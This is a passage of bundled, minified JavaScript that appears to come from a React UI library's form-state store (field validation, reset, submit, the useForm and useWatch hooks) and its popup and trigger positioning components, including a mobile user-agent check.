            return ot.isFieldValidating();
          });
        var nt = s.map(getNamePath);
        return tt.some(function (ot) {
          var st = ot.getNamePath();
          return containsNamePath(nt, st) && ot.isFieldValidating();
        });
      }),
      _defineProperty$1(this, "isFieldValidating", function (s) {
        return o.warningUnhooked(), o.isFieldsValidating([s]);
      }),
      _defineProperty$1(this, "resetWithFieldInitialValue", function () {
        var s =
            arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : {},
          tt = new NameMap(),
          nt = o.getFieldEntities(!0);
        nt.forEach(function (ft) {
          var ht = ft.props.initialValue,
            gt = ft.getNamePath();
          if (ht !== void 0) {
            var St = tt.get(gt) || new Set();
            St.add({ entity: ft, value: ht }), tt.set(gt, St);
          }
        });
        var ot = function (ht) {
            ht.forEach(function (gt) {
              var St = gt.props.initialValue;
              if (St !== void 0) {
                var vt = gt.getNamePath(),
                  _t = o.getInitialValue(vt);
                if (_t !== void 0)
                  warningOnce(
                    !1,
                    "Form already set 'initialValues' with path '".concat(
                      vt.join("."),
                      "'. Field can not overwrite it."
                    )
                  );
                else {
                  var Et = tt.get(vt);
                  if (Et && Et.size > 1)
                    warningOnce(
                      !1,
                      "Multiple Field with path '".concat(
                        vt.join("."),
                        "' set 'initialValue'. Can not decide which one to pick."
                      )
                    );
                  else if (Et) {
                    var Ct = o.getFieldValue(vt),
                      Pt = gt.isListField();
                    !Pt &&
                      (!s.skipExist || Ct === void 0) &&
                      o.updateStore(
                        set$1(o.store, vt, _toConsumableArray(Et)[0].value)
                      );
                  }
                }
              }
            });
          },
          st;
        s.entities
          ? (st = s.entities)
          : s.namePathList
          ? ((st = []),
            s.namePathList.forEach(function (ft) {
              var ht = tt.get(ft);
              if (ht) {
                var gt;
                (gt = st).push.apply(
                  gt,
                  _toConsumableArray(
                    _toConsumableArray(ht).map(function (St) {
                      return St.entity;
                    })
                  )
                );
              }
            }))
          : (st = nt),
          ot(st);
      }),
      _defineProperty$1(this, "resetFields", function (s) {
        o.warningUnhooked();
        var tt = o.store;
        if (!s) {
          o.updateStore(merge$1(o.initialValues)),
            o.resetWithFieldInitialValue(),
            o.notifyObservers(tt, null, { type: "reset" }),
            o.notifyWatch();
          return;
        }
        var nt = s.map(getNamePath);
        nt.forEach(function (ot) {
          var st = o.getInitialValue(ot);
          o.updateStore(set$1(o.store, ot, st));
        }),
          o.resetWithFieldInitialValue({ namePathList: nt }),
          o.notifyObservers(tt, nt, { type: "reset" }),
          o.notifyWatch(nt);
      }),
      _defineProperty$1(this, "setFields", function (s) {
        o.warningUnhooked();
        var tt = o.store,
          nt = [];
        s.forEach(function (ot) {
          var st = ot.name,
            ft = _objectWithoutProperties$1(ot, _excluded$9),
            ht = getNamePath(st);
          nt.push(ht),
            "value" in ft && o.updateStore(set$1(o.store, ht, ft.value)),
            o.notifyObservers(tt, [ht], { type: "setField", data: ot });
        }),
          o.notifyWatch(nt);
      }),
      _defineProperty$1(this, "getFields", function () {
        var s = o.getFieldEntities(!0),
          tt = s.map(function (nt) {
            var ot = nt.getNamePath(),
              st = nt.getMeta(),
              ft = _objectSpread2$1(
                _objectSpread2$1({}, st),
                {},
                { name: ot, value: o.getFieldValue(ot) }
              );
            return (
              Object.defineProperty(ft, "originRCField", { value: !0 }), ft
            );
          });
        return tt;
      }),
      _defineProperty$1(this, "initEntityValue", function (s) {
        var tt = s.props.initialValue;
        if (tt !== void 0) {
          var nt = s.getNamePath(),
            ot = get(o.store, nt);
          ot === void 0 && o.updateStore(set$1(o.store, nt, tt));
        }
      }),
      _defineProperty$1(this, "isMergedPreserve", function (s) {
        var tt = s !== void 0 ? s : o.preserve;
        return tt ?? !0;
      }),
      _defineProperty$1(this, "registerField", function (s) {
        o.fieldEntities.push(s);
        var tt = s.getNamePath();
        if ((o.notifyWatch([tt]), s.props.initialValue !== void 0)) {
          var nt = o.store;
          o.resetWithFieldInitialValue({ entities: [s], skipExist: !0 }),
            o.notifyObservers(nt, [s.getNamePath()], {
              type: "valueUpdate",
              source: "internal",
            });
        }
        return function (ot, st) {
          var ft =
            arguments.length > 2 && arguments[2] !== void 0 ? arguments[2] : [];
          if (
            ((o.fieldEntities = o.fieldEntities.filter(function (St) {
              return St !== s;
            })),
            !o.isMergedPreserve(st) && (!ot || ft.length > 1))
          ) {
            var ht = ot ? void 0 : o.getInitialValue(tt);
            if (
              tt.length &&
              o.getFieldValue(tt) !== ht &&
              o.fieldEntities.every(function (St) {
                return !matchNamePath(St.getNamePath(), tt);
              })
            ) {
              var gt = o.store;
              o.updateStore(set$1(gt, tt, ht, !0)),
                o.notifyObservers(gt, [tt], { type: "remove" }),
                o.triggerDependenciesUpdate(gt, tt);
            }
          }
          o.notifyWatch([tt]);
        };
      }),
      _defineProperty$1(this, "dispatch", function (s) {
        switch (s.type) {
          case "updateValue": {
            var tt = s.namePath,
              nt = s.value;
            o.updateValue(tt, nt);
            break;
          }
          case "validateField": {
            var ot = s.namePath,
              st = s.triggerName;
            o.validateFields([ot], { triggerName: st });
            break;
          }
        }
      }),
      _defineProperty$1(this, "notifyObservers", function (s, tt, nt) {
        if (o.subscribable) {
          var ot = _objectSpread2$1(
            _objectSpread2$1({}, nt),
            {},
            { store: o.getFieldsValue(!0) }
          );
          o.getFieldEntities().forEach(function (st) {
            var ft = st.onStoreChange;
            ft(s, tt, ot);
          });
        } else o.forceRootUpdate();
      }),
      _defineProperty$1(this, "triggerDependenciesUpdate", function (s, tt) {
        var nt = o.getDependencyChildrenFields(tt);
        return (
          nt.length && o.validateFields(nt),
          o.notifyObservers(s, nt, {
            type: "dependenciesUpdate",
            relatedFields: [tt].concat(_toConsumableArray(nt)),
          }),
          nt
        );
      }),
      _defineProperty$1(this, "updateValue", function (s, tt) {
        var nt = getNamePath(s),
          ot = o.store;
        o.updateStore(set$1(o.store, nt, tt)),
          o.notifyObservers(ot, [nt], {
            type: "valueUpdate",
            source: "internal",
          }),
          o.notifyWatch([nt]);
        var st = o.triggerDependenciesUpdate(ot, nt),
          ft = o.callbacks.onValuesChange;
        if (ft) {
          var ht = cloneByNamePathList(o.store, [nt]);
          ft(ht, o.getFieldsValue());
        }
        o.triggerOnFieldsChange([nt].concat(_toConsumableArray(st)));
      }),
      _defineProperty$1(this, "setFieldsValue", function (s) {
        o.warningUnhooked();
        var tt = o.store;
        if (s) {
          var nt = merge$1(o.store, s);
          o.updateStore(nt);
        }
        o.notifyObservers(tt, null, {
          type: "valueUpdate",
          source: "external",
        }),
          o.notifyWatch();
      }),
      _defineProperty$1(this, "setFieldValue", function (s, tt) {
        o.setFields([{ name: s, value: tt, errors: [], warnings: [] }]);
      }),
      _defineProperty$1(this, "getDependencyChildrenFields", function (s) {
        var tt = new Set(),
          nt = [],
          ot = new NameMap();
        o.getFieldEntities().forEach(function (ft) {
          var ht = ft.props.dependencies;
          (ht || []).forEach(function (gt) {
            var St = getNamePath(gt);
            ot.update(St, function () {
              var vt =
                arguments.length > 0 && arguments[0] !== void 0
                  ? arguments[0]
                  : new Set();
              return vt.add(ft), vt;
            });
          });
        });
        var st = function ft(ht) {
          var gt = ot.get(ht) || new Set();
          gt.forEach(function (St) {
            if (!tt.has(St)) {
              tt.add(St);
              var vt = St.getNamePath();
              St.isFieldDirty() && vt.length && (nt.push(vt), ft(vt));
            }
          });
        };
        return st(s), nt;
      }),
      _defineProperty$1(this, "triggerOnFieldsChange", function (s, tt) {
        var nt = o.callbacks.onFieldsChange;
        if (nt) {
          var ot = o.getFields();
          if (tt) {
            var st = new NameMap();
            tt.forEach(function (ht) {
              var gt = ht.name,
                St = ht.errors;
              st.set(gt, St);
            }),
              ot.forEach(function (ht) {
                ht.errors = st.get(ht.name) || ht.errors;
              });
          }
          var ft = ot.filter(function (ht) {
            var gt = ht.name;
            return containsNamePath(s, gt);
          });
          ft.length && nt(ft, ot);
        }
      }),
      _defineProperty$1(this, "validateFields", function (s, tt) {
        o.warningUnhooked();
        var nt, ot;
        Array.isArray(s) || typeof s == "string" || typeof tt == "string"
          ? ((nt = s), (ot = tt))
          : (ot = s);
        var st = !!nt,
          ft = st ? nt.map(getNamePath) : [],
          ht = [],
          gt = String(Date.now()),
          St = new Set(),
          vt = ot || {},
          _t = vt.recursive,
          Et = vt.dirty;
        o.getFieldEntities(!0).forEach(function (xt) {
          if (
            (st || ft.push(xt.getNamePath()),
            !(!xt.props.rules || !xt.props.rules.length) &&
              !(Et && !xt.isFieldDirty()))
          ) {
            var yt = xt.getNamePath();
            if ((St.add(yt.join(gt)), !st || containsNamePath(ft, yt, _t))) {
              var wt = xt.validateRules(
                _objectSpread2$1(
                  {
                    validateMessages: _objectSpread2$1(
                      _objectSpread2$1({}, defaultValidateMessages),
                      o.validateMessages
                    ),
                  },
                  ot
                )
              );
              ht.push(
                wt
                  .then(function () {
                    return { name: yt, errors: [], warnings: [] };
                  })
                  .catch(function ($t) {
                    var kt,
                      Rt = [],
                      It = [];
                    return (
                      (kt = $t.forEach) === null ||
                        kt === void 0 ||
                        kt.call($t, function (Ot) {
                          var Nt = Ot.rule.warningOnly,
                            zt = Ot.errors;
                          Nt
                            ? It.push.apply(It, _toConsumableArray(zt))
                            : Rt.push.apply(Rt, _toConsumableArray(zt));
                        }),
                      Rt.length
                        ? Promise.reject({ name: yt, errors: Rt, warnings: It })
                        : { name: yt, errors: Rt, warnings: It }
                    );
                  })
              );
            }
          }
        });
        var Ct = allPromiseFinish(ht);
        (o.lastValidatePromise = Ct),
          Ct.catch(function (xt) {
            return xt;
          }).then(function (xt) {
            var yt = xt.map(function (wt) {
              var $t = wt.name;
              return $t;
            });
            o.notifyObservers(o.store, yt, { type: "validateFinish" }),
              o.triggerOnFieldsChange(yt, xt);
          });
        var Pt = Ct.then(function () {
          return o.lastValidatePromise === Ct
            ? Promise.resolve(o.getFieldsValue(ft))
            : Promise.reject([]);
        }).catch(function (xt) {
          var yt = xt.filter(function (wt) {
            return wt && wt.errors.length;
          });
          return Promise.reject({
            values: o.getFieldsValue(ft),
            errorFields: yt,
            outOfDate: o.lastValidatePromise !== Ct,
          });
        });
        Pt.catch(function (xt) {
          return xt;
        });
        var bt = ft.filter(function (xt) {
          return St.has(xt.join(gt));
        });
        return o.triggerOnFieldsChange(bt), Pt;
      }),
      _defineProperty$1(this, "submit", function () {
        o.warningUnhooked(),
          o
            .validateFields()
            .then(function (s) {
              var tt = o.callbacks.onFinish;
              if (tt)
                try {
                  tt(s);
                } catch (nt) {
                  console.error(nt);
                }
            })
            .catch(function (s) {
              var tt = o.callbacks.onFinishFailed;
              tt && tt(s);
            });
      }),
      (this.forceRootUpdate = a);
  });
function useForm(i) {
  var a = reactExports.useRef(),
    o = reactExports.useState({}),
    s = _slicedToArray$1(o, 2),
    tt = s[1];
  if (!a.current)
    if (i) a.current = i;
    else {
      var nt = function () {
          tt({});
        },
        ot = new FormStore(nt);
      a.current = ot.getForm();
    }
  return [a.current];
}
var FormContext = reactExports.createContext({
    triggerFormChange: function () {},
    triggerFormFinish: function () {},
    registerForm: function () {},
    unregisterForm: function () {},
  }),
  FormProvider = function (a) {
    var o = a.validateMessages,
      s = a.onFormChange,
      tt = a.onFormFinish,
      nt = a.children,
      ot = reactExports.useContext(FormContext),
      st = reactExports.useRef({});
    return reactExports.createElement(
      FormContext.Provider,
      {
        value: _objectSpread2$1(
          _objectSpread2$1({}, ot),
          {},
          {
            validateMessages: _objectSpread2$1(
              _objectSpread2$1({}, ot.validateMessages),
              o
            ),
            triggerFormChange: function (ht, gt) {
              s && s(ht, { changedFields: gt, forms: st.current }),
                ot.triggerFormChange(ht, gt);
            },
            triggerFormFinish: function (ht, gt) {
              tt && tt(ht, { values: gt, forms: st.current }),
                ot.triggerFormFinish(ht, gt);
            },
            registerForm: function (ht, gt) {
              ht &&
                (st.current = _objectSpread2$1(
                  _objectSpread2$1({}, st.current),
                  {},
                  _defineProperty$1({}, ht, gt)
                )),
                ot.registerForm(ht, gt);
            },
            unregisterForm: function (ht) {
              var gt = _objectSpread2$1({}, st.current);
              delete gt[ht], (st.current = gt), ot.unregisterForm(ht);
            },
          }
        ),
      },
      nt
    );
  },
  _excluded$8 = [
    "name",
    "initialValues",
    "fields",
    "form",
    "preserve",
    "children",
    "component",
    "validateMessages",
    "validateTrigger",
    "onValuesChange",
    "onFieldsChange",
    "onFinish",
    "onFinishFailed",
    "clearOnDestroy",
  ],
  Form = function (a, o) {
    var s = a.name,
      tt = a.initialValues,
      nt = a.fields,
      ot = a.form,
      st = a.preserve,
      ft = a.children,
      ht = a.component,
      gt = ht === void 0 ? "form" : ht,
      St = a.validateMessages,
      vt = a.validateTrigger,
      _t = vt === void 0 ? "onChange" : vt,
      Et = a.onValuesChange,
      Ct = a.onFieldsChange,
      Pt = a.onFinish,
      bt = a.onFinishFailed,
      xt = a.clearOnDestroy,
      yt = _objectWithoutProperties$1(a, _excluded$8),
      wt = reactExports.useRef(null),
      $t = reactExports.useContext(FormContext),
      kt = useForm(ot),
      Rt = _slicedToArray$1(kt, 1),
      It = Rt[0],
      Ot = It.getInternalHooks(HOOK_MARK),
      Nt = Ot.useSubscribe,
      zt = Ot.setInitialValues,
      Bt = Ot.setCallbacks,
      Wt = Ot.setValidateMessages,
      Gt = Ot.setPreserve,
      Vt = Ot.destroyForm;
    reactExports.useImperativeHandle(o, function () {
      return _objectSpread2$1(
        _objectSpread2$1({}, It),
        {},
        { nativeElement: wt.current }
      );
    }),
      reactExports.useEffect(
        function () {
          return (
            $t.registerForm(s, It),
            function () {
              $t.unregisterForm(s);
            }
          );
        },
        [$t, It, s]
      ),
      Wt(_objectSpread2$1(_objectSpread2$1({}, $t.validateMessages), St)),
      Bt({
        onValuesChange: Et,
        onFieldsChange: function (Ht) {
          if (($t.triggerFormChange(s, Ht), Ct)) {
            for (
              var Kt = arguments.length,
                qt = new Array(Kt > 1 ? Kt - 1 : 0),
                Qt = 1;
              Qt < Kt;
              Qt++
            )
              qt[Qt - 1] = arguments[Qt];
            Ct.apply(void 0, [Ht].concat(qt));
          }
        },
        onFinish: function (Ht) {
          $t.triggerFormFinish(s, Ht), Pt && Pt(Ht);
        },
        onFinishFailed: bt,
      }),
      Gt(st);
    var Mt = reactExports.useRef(null);
    zt(tt, !Mt.current),
      Mt.current || (Mt.current = !0),
      reactExports.useEffect(function () {
        return function () {
          return Vt(xt);
        };
      }, []);
    var Ft,
      Tt = typeof ft == "function";
    if (Tt) {
      var At = It.getFieldsValue(!0);
      Ft = ft(At, It);
    } else Ft = ft;
    Nt(!Tt);
    var Lt = reactExports.useRef();
    reactExports.useEffect(
      function () {
        isSimilar(Lt.current || [], nt || []) || It.setFields(nt || []),
          (Lt.current = nt);
      },
      [nt, It]
    );
    var jt = reactExports.useMemo(
        function () {
          return _objectSpread2$1(
            _objectSpread2$1({}, It),
            {},
            { validateTrigger: _t }
          );
        },
        [It, _t]
      ),
      Dt = reactExports.createElement(
        ListContext.Provider,
        { value: null },
        reactExports.createElement(Context.Provider, { value: jt }, Ft)
      );
    return gt === !1
      ? Dt
      : reactExports.createElement(
          gt,
          _extends({}, yt, {
            ref: wt,
            onSubmit: function (Ht) {
              Ht.preventDefault(), Ht.stopPropagation(), It.submit();
            },
            onReset: function (Ht) {
              var Kt;
              Ht.preventDefault(),
                It.resetFields(),
                (Kt = yt.onReset) === null || Kt === void 0 || Kt.call(yt, Ht);
            },
          }),
          Dt
        );
  };
function stringify$1(i) {
  try {
    return JSON.stringify(i);
  } catch {
    return Math.random();
  }
}
function useWatch$1() {
  for (var i = arguments.length, a = new Array(i), o = 0; o < i; o++)
    a[o] = arguments[o];
  var s = a[0],
    tt = a[1],
    nt = tt === void 0 ? {} : tt,
    ot = isFormInstance(nt) ? { form: nt } : nt,
    st = ot.form,
    ft = reactExports.useState(),
    ht = _slicedToArray$1(ft, 2),
    gt = ht[0],
    St = ht[1],
    vt = reactExports.useMemo(
      function () {
        return stringify$1(gt);
      },
      [gt]
    ),
    _t = reactExports.useRef(vt);
  _t.current = vt;
  var Et = reactExports.useContext(Context),
    Ct = st || Et,
    Pt = Ct && Ct._init,
    bt = getNamePath(s),
    xt = reactExports.useRef(bt);
  return (
    (xt.current = bt),
    reactExports.useEffect(
      function () {
        if (Pt) {
          var yt = Ct.getFieldsValue,
            wt = Ct.getInternalHooks,
            $t = wt(HOOK_MARK),
            kt = $t.registerWatch,
            Rt = function (zt, Bt) {
              var Wt = ot.preserve ? Bt : zt;
              return typeof s == "function" ? s(Wt) : get(Wt, xt.current);
            },
            It = kt(function (Nt, zt) {
              var Bt = Rt(Nt, zt),
                Wt = stringify$1(Bt);
              _t.current !== Wt && ((_t.current = Wt), St(Bt));
            }),
            Ot = Rt(yt(), yt(!0));
          return gt !== Ot && St(Ot), It;
        }
      },
      [Pt]
    ),
    gt
  );
}
var InternalForm = reactExports.forwardRef(Form),
  RefForm = InternalForm;
RefForm.FormProvider = FormProvider;
RefForm.Field = WrapperField;
RefForm.List = List;
RefForm.useForm = useForm;
RefForm.useWatch = useWatch$1;
const FormItemInputContext = reactExports.createContext({}),
  NoFormStyle = (i) => {
    let { children: a, status: o, override: s } = i;
    const tt = reactExports.useContext(FormItemInputContext),
      nt = reactExports.useMemo(() => {
        const ot = Object.assign({}, tt);
        return (
          s && delete ot.isFormItemInput,
          o &&
            (delete ot.status, delete ot.hasFeedback, delete ot.feedbackIcon),
          ot
        );
      }, [o, s, tt]);
    return reactExports.createElement(
      FormItemInputContext.Provider,
      { value: nt },
      a
    );
  },
  VariantContext = reactExports.createContext(void 0),
  ContextIsolator = (i) => {
    const { space: a, form: o, children: s } = i;
    if (s == null) return null;
    let tt = s;
    return (
      o &&
        (tt = React$1.createElement(
          NoFormStyle,
          { override: !0, status: !0 },
          tt
        )),
      a && (tt = React$1.createElement(NoCompactStyle, null, tt)),
      tt
    );
  },
  AppConfigContext = React$1.createContext({}),
  isMobile = function () {
    if (typeof navigator > "u" || typeof window > "u") return !1;
    var i = navigator.userAgent || navigator.vendor || window.opera;
    return (
      /(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino|android|ipad|playbook|silk/i.test(
        i
      ) ||
      /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw-(n|u)|c55\/|capi|ccwa|cdm-|cell|chtm|cldc|cmd-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc-s|devi|dica|dmob|do(c|p)o|ds(12|-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(-|_)|g1 u|g560|gene|gf-5|g-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd-(m|p|t)|hei-|hi(pt|ta)|hp( i|ip)|hs-c|ht(c(-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i-(20|go|ma)|i230|iac( |-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|-[a-w])|libw|lynx|m1-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|-([1-8]|c))|phil|pire|pl(ay|uc)|pn-2|po(ck|rt|se)|prox|psio|pt-g|qa-a|qc(07|12|21|32|60|-[2-7]|i-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h-|oo|p-)|sdk\/|se(c(-|0|1)|47|mc|nd|ri)|sgh-|shar|sie(-|m)|sk-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h-|v-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl-|tdg-|tel(i|m)|tim-|t-mo|to(pl|sh)|ts(70|m-|m3|m5)|tx-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas-|your|zeto|zte-/i.test(
        i == null ? void 0 : i.substr(0, 4)
      )
    );
  };
function Arrow(i) {
  var a = i.prefixCls,
    o = i.align,
    s = i.arrow,
    tt = i.arrowPos,
    nt = s || {},
    ot = nt.className,
    st = nt.content,
    ft = tt.x,
    ht = ft === void 0 ? 0 : ft,
    gt = tt.y,
    St = gt === void 0 ? 0 : gt,
    vt = reactExports.useRef();
  if (!o || !o.points) return null;
  var _t = { position: "absolute" };
  if (o.autoArrow !== !1) {
    var Et = o.points[0],
      Ct = o.points[1],
      Pt = Et[0],
      bt = Et[1],
      xt = Ct[0],
      yt = Ct[1];
    Pt === xt || !["t", "b"].includes(Pt)
      ? (_t.top = St)
      : Pt === "t"
      ? (_t.top = 0)
      : (_t.bottom = 0),
      bt === yt || !["l", "r"].includes(bt)
        ? (_t.left = ht)
        : bt === "l"
        ? (_t.left = 0)
        : (_t.right = 0);
  }
  return reactExports.createElement(
    "div",
    { ref: vt, className: classNames("".concat(a, "-arrow"), ot), style: _t },
    st
  );
}
function Mask(i) {
  var a = i.prefixCls,
    o = i.open,
    s = i.zIndex,
    tt = i.mask,
    nt = i.motion;
  return tt
    ? reactExports.createElement(
        CSSMotion,
        _extends({}, nt, { motionAppear: !0, visible: o, removeOnLeave: !0 }),
        function (ot) {
          var st = ot.className;
          return reactExports.createElement("div", {
            style: { zIndex: s },
            className: classNames("".concat(a, "-mask"), st),
          });
        }
      )
    : null;
}
var PopupContent = reactExports.memo(
    function (i) {
      var a = i.children;
      return a;
    },
    function (i, a) {
      return a.cache;
    }
  ),
  Popup$1 = reactExports.forwardRef(function (i, a) {
    var o = i.popup,
      s = i.className,
      tt = i.prefixCls,
      nt = i.style,
      ot = i.target,
      st = i.onVisibleChanged,
      ft = i.open,
      ht = i.keepDom,
      gt = i.fresh,
      St = i.onClick,
      vt = i.mask,
      _t = i.arrow,
      Et = i.arrowPos,
      Ct = i.align,
      Pt = i.motion,
      bt = i.maskMotion,
      xt = i.forceRender,
      yt = i.getPopupContainer,
      wt = i.autoDestroy,
      $t = i.portal,
      kt = i.zIndex,
      Rt = i.onMouseEnter,
      It = i.onMouseLeave,
      Ot = i.onPointerEnter,
      Nt = i.onPointerDownCapture,
      zt = i.ready,
      Bt = i.offsetX,
      Wt = i.offsetY,
      Gt = i.offsetR,
      Vt = i.offsetB,
      Mt = i.onAlign,
      Ft = i.onPrepare,
      Tt = i.stretch,
      At = i.targetWidth,
      Lt = i.targetHeight,
      jt = typeof o == "function" ? o() : o,
      Dt = ft || ht,
      Ut = (yt == null ? void 0 : yt.length) > 0,
      Ht = reactExports.useState(!yt || !Ut),
      Kt = _slicedToArray$1(Ht, 2),
      qt = Kt[0],
      Qt = Kt[1];
    if (
      (useLayoutEffect(
        function () {
          !qt && Ut && ot && Qt(!0);
        },
        [qt, Ut, ot]
      ),
      !qt)
    )
      return null;
    var Zt = "auto",
      Jt = { left: "-1000vw", top: "-1000vh", right: Zt, bottom: Zt };
    if (zt || !ft) {
      var er,
        sr = Ct.points,
        nr =
          Ct.dynamicInset ||
          ((er = Ct._experimental) === null || er === void 0
            ? void 0
            : er.dynamicInset),
        tr = nr && sr[0][1] === "r",
        Xt = nr && sr[0][0] === "b";
      tr
        ? ((Jt.right = Gt), (Jt.left = Zt))
        : ((Jt.left = Bt), (Jt.right = Zt)),
        Xt
          ? ((Jt.bottom = Vt), (Jt.top = Zt))
          : ((Jt.top = Wt), (Jt.bottom = Zt));
    }
    var hr = {};
    return (
      Tt &&
        (Tt.includes("height") && Lt
          ? (hr.height = Lt)
          : Tt.includes("minHeight") && Lt && (hr.minHeight = Lt),
        Tt.includes("width") && At
          ? (hr.width = At)
          : Tt.includes("minWidth") && At && (hr.minWidth = At)),
      ft || (hr.pointerEvents = "none"),
      reactExports.createElement(
        $t,
        {
          open: xt || Dt,
          getContainer:
            yt &&
            function () {
              return yt(ot);
            },
          autoDestroy: wt,
        },
        reactExports.createElement(Mask, {
          prefixCls: tt,
          open: ft,
          zIndex: kt,
          mask: vt,
          motion: bt,
        }),
        reactExports.createElement(
          RefResizeObserver,
          { onResize: Mt, disabled: !ft },
          function (cr) {
            return reactExports.createElement(
              CSSMotion,
              _extends(
                {
                  motionAppear: !0,
                  motionEnter: !0,
                  motionLeave: !0,
                  removeOnLeave: !1,
                  forceRender: xt,
                  leavedClassName: "".concat(tt, "-hidden"),
                },
                Pt,
                {
                  onAppearPrepare: Ft,
                  onEnterPrepare: Ft,
                  visible: ft,
                  onVisibleChanged: function (vr) {
                    var xr;
                    Pt == null ||
                      (xr = Pt.onVisibleChanged) === null ||
                      xr === void 0 ||
                      xr.call(Pt, vr),
                      st(vr);
                  },
                }
              ),
              function (yr, vr) {
                var xr = yr.className,
                  Sr = yr.style,
                  or = classNames(tt, xr, s);
                return reactExports.createElement(
                  "div",
                  {
                    ref: composeRef(cr, a, vr),
                    className: or,
                    style: _objectSpread2$1(
                      _objectSpread2$1(
                        _objectSpread2$1(
                          _objectSpread2$1(
                            {
                              "--arrow-x": "".concat(Et.x || 0, "px"),
                              "--arrow-y": "".concat(Et.y || 0, "px"),
                            },
                            Jt
                          ),
                          hr
                        ),
                        Sr
                      ),
                      {},
                      { boxSizing: "border-box", zIndex: kt },
                      nt
                    ),
                    onMouseEnter: Rt,
                    onMouseLeave: It,
                    onPointerEnter: Ot,
                    onClick: St,
                    onPointerDownCapture: Nt,
                  },
                  _t &&
                    reactExports.createElement(Arrow, {
                      prefixCls: tt,
                      arrow: _t,
                      arrowPos: Et,
                      align: Ct,
                    }),
                  reactExports.createElement(
                    PopupContent,
                    { cache: !ft && !gt },
                    jt
                  )
                );
              }
            );
          }
        )
      )
    );
  }),
  TriggerWrapper = reactExports.forwardRef(function (i, a) {
    var o = i.children,
      s = i.getTriggerDOMNode,
      tt = supportRef(o),
      nt = reactExports.useCallback(
        function (st) {
          fillRef(a, s ? s(st) : st);
        },
        [s]
      ),
      ot = useComposeRef(nt, getNodeRef(o));
    return tt ? reactExports.cloneElement(o, { ref: ot }) : o;
  }),
  TriggerContext = reactExports.createContext(null);
function toArray(i) {
  return i ? (Array.isArray(i) ? i : [i]) : [];
}
function useAction(i, a, o, s) {
  return reactExports.useMemo(
    function () {
      var tt = toArray(o ?? a),
        nt = toArray(s ?? a),
        ot = new Set(tt),
        st = new Set(nt);
      return (
        i &&
          (ot.has("hover") && (ot.delete("hover"), ot.add("click")),
          st.has("hover") && (st.delete("hover"), st.add("click"))),
        [ot, st]
      );
    },
    [i, a, o, s]
  );
}
function isPointsEq() {
  var i = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : [],
    a = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : [],
    o = arguments.length > 2 ? arguments[2] : void 0;
  return o ? i[0] === a[0] : i[0] === a[0] && i[1] === a[1];
}
function getAlignPopupClassName(i, a, o, s) {
  for (
    var tt = o.points, nt = Object.keys(i), ot = 0;
    ot < nt.length;
    ot += 1
  ) {
    var st,
      ft = nt[ot];
    if (
      isPointsEq(
        (st = i[ft]) === null || st === void 0 ? void 0 : st.points,
        tt,
        s
      )
    )
      return "".concat(a, "-placement-").concat(ft);
  }
  return "";
}
function getMotion(i, a, o, s) {
  return (
    a ||
    (o
      ? { motionName: "".concat(i, "-").concat(o) }
      : s
      ? { motionName: s }
      : null)
  );
}
function getWin(i) {
  return i.ownerDocument.defaultView;
}
function collectScroller(i) {
  for (
    var a = [],
      o = i == null ? void 0 : i.parentElement,
      s = ["hidden", "scroll", "clip", "auto"];
    o;

  ) {
    var tt = getWin(o).getComputedStyle(o),
      nt = tt.overflowX,
      ot = tt.overflowY,
      st = tt.overflow;
    [nt, ot, st].some(function (ft) {
      return s.includes(ft);
    }) && a.push(o),
      (o = o.parentElement);
  }
  return a;
}
function toNum(i) {
  var a = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : 1;
  return Number.isNaN(i) ? a : i;
}
function getPxValue(i) {
  return toNum(parseFloat(i), 0);
}
function getVisibleArea(i, a) {
  var o = _objectSpread2$1({}, i);
  return (
    (a || []).forEach(function (s) {
      if (!(s instanceof HTMLBodyElement || s instanceof HTMLHtmlElement)) {
        var tt = getWin(s).getComputedStyle(s),
          nt = tt.overflow,
          ot = tt.overflowClipMargin,
          st = tt.borderTopWidth,
          ft = tt.borderBottomWidth,
          ht = tt.borderLeftWidth,
          gt = tt.borderRightWidth,
          St = s.getBoundingClientRect(),
          vt = s.offsetHeight,
          _t = s.clientHeight,
          Et = s.offsetWidth,
          Ct = s.clientWidth,
          Pt = getPxValue(st),
          bt = getPxValue(ft),
          xt = getPxValue(ht),
          yt = getPxValue(gt),
